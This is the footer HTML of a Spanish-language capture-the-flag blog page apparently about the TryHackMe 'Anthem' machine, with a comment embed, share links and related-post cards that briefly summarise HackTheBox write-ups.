+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=TryHackMe - Anthem&url=http://localhost:4000/thm/anthem" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CMS">CMS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#RDP">RDP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#icacls">icacls</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#thm">thm</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/writeup">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/writeup/192banner.png" alt="HackTheBox - Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/writeup">HackTheBox - Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, nos miraremos a los ojos con un CMS vulnerable a SQLi time-based. Haremos reutilización de credenciales y encontraremos un PATH Hijacking guapetón.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">09 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/blunder">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png" alt="HackTheBox - Blunder"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/blunder">HackTheBox - Blunder</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con “sudo -l” para convertirnos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Oct 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/remote">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png" alt="HackTheBox - Remote"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/remote">HackTheBox - Remote</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">05 Sep 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
